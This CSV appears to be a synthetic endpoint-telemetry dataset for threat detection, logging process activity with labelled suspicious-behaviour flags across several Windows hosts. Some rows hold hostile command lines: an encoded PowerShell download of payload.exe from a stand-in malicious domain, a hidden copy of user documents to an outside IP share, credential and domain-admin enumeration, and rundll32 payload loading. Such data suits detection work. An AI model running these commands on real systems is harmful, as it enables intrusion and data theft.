timestamp,hostname,os_type,name,pid,ppid,user,exe_path,cmdline,remote_ips,dns_queries,outbound_bytes,inbound_bytes,conn_count,rwx_segments_count,anonymous_mem_size,registry_writes,script_execution,obfuscated_script,registry_persistence_access,exe_mismatch,credential_access,remote_mem_operations,child_processes,loaded_modules
2023-12-01 00:15:20,FINANCE-SRV01,Windows,svchost.exe,1234,4,SYSTEM,C:\Windows\System32\svchost.exe,svchost.exe -k NetworkService,"[""10.0.0.45"", ""45.33.22.11""]","[""update.malicious-domain.com""]",1200,500,2,0,0,[],0,0,0,0,0,0,[],[]
2023-12-02 02:35:40,FINANCE-SRV01,Windows,svchost.exe,1234,4,SYSTEM,C:\Windows\System32\svchost.exe,svchost.exe -k NetworkService,"[""10.0.0.45"", ""45.33.22.11""]",[],1250,520,2,0,0,[],0,0,0,0,0,0,[],[]
2023-12-03 01:45:30,FINANCE-SRV01,Windows,svchost.exe,1234,4,SYSTEM,C:\Windows\System32\svchost.exe,svchost.exe -k NetworkService,"[""10.0.0.45"", ""45.33.22.11""]",[],1180,490,2,0,0,[],0,0,0,0,0,0,[],[]
2023-12-03 14:20:10,HR-PC05,Windows,explorer.exe,2540,2220,sarah.jones,C:\Windows\explorer.exe,explorer.exe,[],[],0,0,0,0,0,[],0,0,0,0,0,0,[],[]
2023-12-03 14:25:45,HR-PC05,Windows,suspicious_file.exe,0,0,sarah.jones,C:\Users\sarah.jones\Downloads\suspicious_file.exe,[],[],[],0,0,0,0,0,[],0,0,0,0,0,0,[],[]
2023-12-10 09:30:22,HR-PC05,Windows,suspicious_file.exe,3450,2540,sarah.jones,C:\Users\sarah.jones\Downloads\suspicious_file.exe,suspicious_file.exe -s -h,"[""192.168.1.254""]",[],1500,200,1,2,2048,[],1,1,0,0,0,0,[],[]
2023-12-10 09:35:10,HR-PC05,Windows,cmd.exe,3520,3450,sarah.jones,C:\Windows\System32\cmd.exe,cmd.exe /c net user,[],[],0,0,0,0,0,[],1,0,0,0,1,0,[],[]
2023-12-10 10:15:30,HR-PC05,Windows,powershell.exe,3550,3520,sarah.jones,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -EncodedCommand JAB1AHIAbAAgAD0AIAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBkAG8AbQBhAGkAbgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJwBDADoAXABUAGUAbQBwAFwAcABhAHkAbABvAGEAZAAuAGUAeABlACcA,"[""45.33.22.11""]",[],3500,4500,1,0,0,[],1,1,0,0,0,0,[],[]
2023-12-10 10:20:15,HR-PC05,Windows,payload.exe,3600,3550,sarah.jones,C:\Temp\payload.exe,payload.exe,"[""45.33.22.11""]",[],5000,1000,1,3,4096,[],0,0,0,1,0,0,[],[]
2023-12-11 03:15:10,IT-ADMIN01,Windows,cmd.exe,4550,820,svc_admin,C:\Windows\System32\cmd.exe,cmd.exe /c net group "Domain Admins",[],[],0,0,0,0,0,[],1,0,0,0,1,0,[],[]
2023-12-11 03:20:45,IT-ADMIN01,Windows,powershell.exe,4580,4550,svc_admin,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -Command "Get-ADUser -Filter * -Properties *",[],[],0,0,0,0,0,[],1,0,0,0,1,0,[],[]
2023-12-12 02:45:30,SQL-DB01,Windows,sqlservr.exe,2100,700,SYSTEM,C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlservr.exe,sqlservr.exe -sMSSQLSERVER,"[""10.0.0.15""]",[],1200,800,2,0,0,[],0,0,0,0,0,0,[],[]
2023-12-12 03:10:20,SQL-DB01,Windows,cmd.exe,2340,1020,svc_admin,C:\Windows\System32\cmd.exe,cmd.exe /c dir /s /b c:\users\*password*,"[""10.0.0.15""]",[],500,100,1,0,0,[],1,0,0,0,1,0,[],[]
2023-12-12 03:30:45,SQL-DB01,Windows,xpcmdshell.exe,2400,2100,svc_admin,C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\xpcmdshell.exe,xpcmdshell.exe "BACKUP DATABASE [Customers] TO DISK='\\10.0.0.45\backup\customers.bak'",[],[],15000000,1000,1,0,0,[],0,0,0,0,0,0,[],[]
2023-12-14 01:05:30,SALES-PC10,Windows,notepad.exe,5640,4220,john.doe,C:\Windows\System32\notepad.exe,notepad.exe c:\temp\notes.txt,[],[],0,0,0,0,0,[],0,0,0,0,0,0,[],[]
2023-12-16 15:20:45,SALES-PC10,Windows,winword.exe,5680,4220,john.doe,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,[],[],0,0,0,0,0,[],0,0,0,0,0,0,[],[]
2023-12-16 15:25:30,SALES-PC10,Windows,cmd.exe,5720,5680,john.doe,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,"[""10.0.0.45""]",[],200,300,1,0,0,[],1,0,0,0,0,0,[],[]
2023-12-17 02:45:15,SALES-PC10,Windows,powershell.exe,5750,5720,john.doe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -Command "Get-Process | Export-Csv c:\temp\processes.csv",[],[],0,0,0,0,0,[],1,0,0,0,0,0,[],[]
2023-12-18 01:15:40,FINANCE-SRV01,Windows,svchost.exe,1234,4,SYSTEM,C:\Windows\System32\svchost.exe,svchost.exe -k NetworkService,"[""45.33.22.11""]",[],1220,510,2,0,0,[],0,0,0,0,0,0,[],[]
2023-12-19 02:30:15,FINANCE-SRV01,Windows,svchost.exe,1234,4,SYSTEM,C:\Windows\System32\svchost.exe,svchost.exe -k NetworkService,"[""45.33.22.11""]",[],1260,530,2,0,0,[],0,0,0,0,0,0,[],[]
2023-12-20 01:45:30,FINANCE-SRV01,Windows,svchost.exe,1234,4,SYSTEM,C:\Windows\System32\svchost.exe,svchost.exe -k NetworkService,"[""45.33.22.11""]",[],1210,500,2,0,0,[],0,0,0,0,0,0,[],[]
2023-12-23 13:20:45,MARKETING-PC03,Windows,svch0st.exe,0,0,mark.wilson,C:\Users\mark.wilson\AppData\Local\Temp\svch0st.exe,[],[],[],0,0,0,0,0,[],0,0,0,0,0,0,[],[]
2023-12-30 02:15:30,MARKETING-PC03,Windows,svch0st.exe,6450,1220,mark.wilson,C:\Users\mark.wilson\AppData\Local\Temp\svch0st.exe,svch0st.exe -silent,"[""198.51.100.23""]",[],75000,2000,3,2,3072,[],0,0,1,1,0,0,[],[]
2023-12-30 03:15:40,MARKETING-PC03,Windows,powershell.exe,6480,6450,mark.wilson,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -WindowStyle Hidden -Command "Get-ChildItem -Path C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination \\198.51.100.23\share\",[],[],125000,1500,1,0,0,[],1,1,0,0,0,0,[],[]
2023-12-31 02:30:15,MARKETING-PC03,Windows,svch0st.exe,6450,1220,mark.wilson,C:\Users\mark.wilson\AppData\Local\Temp\svch0st.exe,svch0st.exe -silent,"[""198.51.100.23""]",[],80000,2200,3,2,3072,[],0,0,1,1,0,0,[],[]
2024-01-01 01:30:15,PAYMENT-SRV02,Windows,mstsc.exe,7220,6850,svc_admin,C:\Windows\System32\mstsc.exe,mstsc.exe /v:FINANCE-SRV01,[],[],0,0,0,0,0,[],0,0,0,0,0,0,[],[]
2024-01-01 01:35:20,PAYMENT-SRV02,Windows,cmd.exe,7250,7220,svc_admin,C:\Windows\System32\cmd.exe,cmd.exe /c net use z: \\FINANCE-SRV01\c$,[],[],0,0,0,0,0,[],1,0,0,0,0,0,[],[]
2024-01-01 01:40:45,PAYMENT-SRV02,Windows,xcopy.exe,7280,7250,svc_admin,C:\Windows\System32\xcopy.exe,xcopy.exe c:\sensitive_data z:\ /s /e,[],[],500000,1000,0,0,0,[],0,0,0,0,0,0,[],[]
2024-01-02 00:15:20,DEV-PC07,Windows,msedge.exe,8350,4520,developer,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe,"[""203.0.113.15""]","[""suspicious-cdn.com""]",3500,250000,5,0,0,[],0,0,0,0,0,0,[],[]
2024-01-02 00:20:45,DEV-PC07,Windows,powershell.exe,8380,8350,developer,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Users\developer\scripts\test.ps1,"[""203.0.113.15""]",[],2500,1500,1,0,0,[],1,0,0,0,0,0,[],[]
2024-01-02 00:25:30,DEV-PC07,Windows,rundll32.exe,8410,8380,developer,C:\Windows\System32\rundll32.exe,rundll32.exe C:\Users\developer\AppData\Local\Temp\payload.dll StartModule,"[""203.0.113.15""]",[],15000,2500,3,2,2048,[],0,0,0,1,0,1,[],[]
2024-01-03 03:10:20,DEV-PC07,Windows,net.exe,8440,8410,developer,C:\Windows\System32\net.exe,net.exe use \\IT-ADMIN01\c$ /user:svc_admin password123,[],[],0,0,0,0,0,[],0,0,0,0,1,0,[],[]
2024-01-03 03:15:45,DEV-PC07,Windows,cmd.exe,8470,8440,developer,C:\Windows\System32\cmd.exe,cmd.exe /c dir \\IT-ADMIN01\c$\Users\Administrator\Documents,[],[],1500,25000,0,0,0,[],0,0,0,0,0,0,[],[]
